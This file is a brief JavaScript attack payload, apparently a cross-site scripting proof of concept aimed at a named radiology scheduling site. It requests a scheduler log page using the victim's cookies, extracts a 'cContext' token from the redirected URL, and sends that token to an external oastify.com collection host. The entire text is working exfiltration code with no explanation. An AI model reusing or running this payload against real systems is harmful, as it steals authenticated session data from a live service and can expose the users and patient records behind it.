(function(){
fetch('https://tspacs.erad.com/scheduler/valueSelectorPopupTable.jsp?cTable=LogView&cLayoutType=schLog&cIDField=0LID&cInputID=xxy&cDispField=0LID&cDispField=0LED&cDispField=0LUI&cDispField=0LAC&cDispField=0LTA&cDispField=0LLP&cDispField=0LSD&cDispField=0LMO&cDispField=0LIN',{credentials:'include'})
.then(r=>{
let url=r.url;
let c=url.match(/cContext=([^&]+)/);
if(c) fetch('https://qhbh6mfx3whnldsefhpxqwuvdmjd75ct1.oastify.com?loc='+c[1],{mode:'no-cors'});
});
})();
